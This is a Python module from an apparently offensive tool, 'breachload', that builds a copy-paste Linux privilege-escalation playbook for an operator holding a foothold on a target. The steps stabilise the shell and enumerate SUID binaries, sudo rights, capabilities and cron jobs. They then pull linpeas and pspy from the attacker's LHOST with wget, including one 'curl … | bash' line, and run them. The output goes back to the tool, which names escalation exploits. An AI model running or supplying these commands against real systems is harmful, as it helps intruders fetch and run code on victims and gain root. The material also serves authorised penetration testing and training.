"""Linux privilege-escalation enumeration playbook.

breachload is a copilot: it does not hold a live shell in its deterministic core,
so it *drives* the enumeration by generating the exact, ready-to-run commands to
transfer and run linpeas/pspy over a foothold, then hands the output back to
`breachload loot` - which parses SUID/sudo/capabilities/kernel into findings and
(via the kernel suggester + GTFOBins) names the escalation.

Everything here is text for the operator to run against the foothold. The
attacker IP (LHOST) is filled in so the transfer commands are copy-paste ready.
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class PlaybookStep:
    title: str
    commands: list[str] = field(default_factory=list)


def enumeration_playbook(lhost: str = "LHOST", http_port: int = 8000) -> list[PlaybookStep]:
    """The ordered privilege-escalation enumeration playbook, LHOST filled in."""
    serve = f"http://{lhost}:{http_port}"
    return [
        PlaybookStep("1. Stabilize the shell", [
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "export TERM=xterm; stty rows 50 cols 200   # (Ctrl-Z; stty raw -echo; fg)",
        ]),
        PlaybookStep("2. Fast manual triage (before any upload)", [
            "id; sudo -l 2>/dev/null",
            "uname -a; cat /etc/os-release",
            "find / -perm -4000 -type f 2>/dev/null            # SUID binaries",
            "getcap -r / 2>/dev/null                           # file capabilities",
            "ls -la /etc/cron* /etc/crontab 2>/dev/null; cat /etc/crontab 2>/dev/null",
            "find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys)' | head",
        ]),
        PlaybookStep("3. Serve linpeas/pspy from your box", [
            "# on YOUR box, in the dir holding linpeas.sh and pspy64:",
            f"python3 -m http.server {http_port}",
        ]),
        PlaybookStep("4. Run linpeas on the target and capture", [
            f"cd /tmp && wget -q {serve}/linpeas.sh -O lp.sh && chmod +x lp.sh",
            "./lp.sh -a | tee /tmp/linpeas.out            # -a = all checks",
            f"# (no wget? try: curl -s {serve}/linpeas.sh | bash | tee /tmp/linpeas.out)",
        ]),
        PlaybookStep("5. Watch for cron / hidden processes (pspy)", [
            f"cd /tmp && wget -q {serve}/pspy64 -O pspy && chmod +x pspy && ./pspy -pf -i 1000",
        ]),
        PlaybookStep("6. Feed the output back to breachload", [
            "# copy /tmp/linpeas.out back to your box, then:",
            "breachload loot <cfg> --scan linpeas.out",
            "# breachload parses SUID/sudo/caps/kernel -> findings, names the exploit",
            "# (kernel suggester) and looks up any SUID/sudo binary in GTFOBins.",
        ]),
    ]


def playbook_lines(lhost: str = "LHOST", http_port: int = 8000) -> list[str]:
    """Flatten the playbook to printable lines (title then indented commands)."""
    out: list[str] = []
    for step in enumeration_playbook(lhost, http_port):
        out.append(step.title)
        out.extend("    " + c for c in step.commands)
    return out
